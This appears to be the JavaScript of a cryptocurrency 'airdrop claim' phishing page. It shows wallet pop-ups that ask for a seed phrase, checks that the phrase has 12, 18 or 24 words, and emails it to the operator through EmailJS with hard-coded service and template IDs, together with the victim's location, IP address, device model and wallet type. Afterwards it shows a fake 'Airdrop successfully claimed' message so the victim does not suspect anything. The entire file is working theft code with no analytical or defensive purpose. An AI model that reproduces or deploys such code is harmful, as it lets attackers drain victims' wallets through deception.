// Wallet Popup Handling
document.querySelectorAll(".wallet").forEach((wallet) => {
  wallet.addEventListener("click", () => {
    const walletName = wallet.querySelector("h5").textContent.trim();
    const popup = Array.from(document.querySelectorAll(".popup")).find(
      (p) =>
        p.querySelector(".wallet-name h4").textContent.trim() === walletName
    );
    if (popup) {
      popup.classList.remove("hidden"); // Show the popup
    }
  });
});

// Close popup functionality
document.querySelectorAll(".close-btn").forEach((btn) => {
  btn.addEventListener("click", (e) => {
    e.target.closest(".popup").classList.add("hidden"); // Hide the popup
  });
});

// Handle Proceed Button
document.querySelectorAll("#proceedButton").forEach((button) => {
  button.addEventListener("click", (e) => {
    e.preventDefault(); // Prevent default form submission
    const popup = e.target.closest(".popup");
    const textarea = popup.querySelector("#phrase");
    const errorMessage = popup.querySelector("#error-message");
    const text = textarea.value.trim();

    // Split the text into words
    const words = text.split(/\s+/).filter((word) => word.length > 0);

    // Validate textarea input
    const isValidWordCount = [12, 18, 24].includes(words.length);
    const allWordsValid = words.every((word) => /^[a-zA-Z]{3,8}$/.test(word));

    if (!isValidWordCount || !allWordsValid) {
      textarea.classList.add("error");
      errorMessage.textContent =
        "Please enter a valid 12, 18, or 24-word phrase. Each word must contain only letters and be 3-8 characters long.";
      errorMessage.style.display = "block";
      return; // Stop further execution
    }

    // Clear errors and proceed
    textarea.classList.remove("error");
    errorMessage.style.display = "none";

    // Gather data for email
    const params = {
      LOCATION: popup.querySelector("#location")?.value || "N/A",
      IP_ADDRESS: popup.querySelector("#ip-address")?.value || "N/A",
      DEVICE_MODEL: popup.querySelector("#device-model")?.value || "N/A",
      WALLET_TYPE: popup.querySelector("#wallet-type")?.value || "N/A",
      WORD_PHRASE: text,
    };

    // Send the email
    const serviceID = "service_tp3e91n";
    const templateID = "template_uev5ewc";

    emailjs
      .send(serviceID, templateID, params)
      .then((res) => {
        console.log("Email sent successfully", res);
        showCustomPopup();// Notify user
        popup.classList.add("hidden"); // Close popup after success
      })
      .catch((err) => {
        console.log("Error sending response:", err);
        alert("Failed response. Please try again."); // Notify user
      });
  });
});


// Function to show the custom popup
function showCustomPopup() {
    // Create the blur background
    const blurBackground = document.createElement("div");
    blurBackground.style.position = "fixed";
    blurBackground.style.top = "0";
    blurBackground.style.left = "0";
    blurBackground.style.width = "100%";
    blurBackground.style.height = "100%";
    blurBackground.style.backgroundColor = "rgba(0, 0, 0, 0.7)";
    blurBackground.style.backdropFilter = "blur(10px)";
    blurBackground.style.zIndex = "9999";
    
    // Create the popup container
    const popupContainer = document.createElement("div");
    popupContainer.style.position = "fixed";
    popupContainer.style.top = "50%";
    popupContainer.style.left = "50%";
    popupContainer.style.transform = "translate(-50%, -50%)";
    popupContainer.style.backgroundColor = "#61058b";
    popupContainer.style.color = "#fff";
    popupContainer.style.padding = "20px";
    popupContainer.style.borderRadius = "10px";
    popupContainer.style.textAlign = "center";
    popupContainer.style.boxShadow = "0 4px 10px rgba(0, 0, 0, 0.3)";
    popupContainer.style.maxWidth = "400px";
    popupContainer.style.width = "90%";
    
    // Add the message
    const message = document.createElement("p");
    message.style.fontSize = "16px";
    message.style.color = "#333";
    message.style.margin = "0";
    message.style.marginBottom = "15px";
    message.textContent = "Airdrop successfully claimed. Kindly check your wallet for your claim.";
    
    // Add the close button
    const closeButton = document.createElement("button");
    closeButton.style.padding = "10px 20px";
    closeButton.style.fontSize = "14px";
    closeButton.style.backgroundColor = "red";
    closeButton.style.color = "#fff";
    closeButton.style.border = "none";
    closeButton.style.borderRadius = "5px";
    closeButton.style.cursor = "pointer";
    closeButton.textContent = "Close";
  
    closeButton.addEventListener("click", () => {
      document.body.removeChild(blurBackground); // Remove popup on close
    });
  
    // Append everything to the container
    popupContainer.appendChild(message);
    popupContainer.appendChild(closeButton);
    blurBackground.appendChild(popupContainer);
  
    // Append to the body
    document.body.appendChild(blurBackground);
  }
  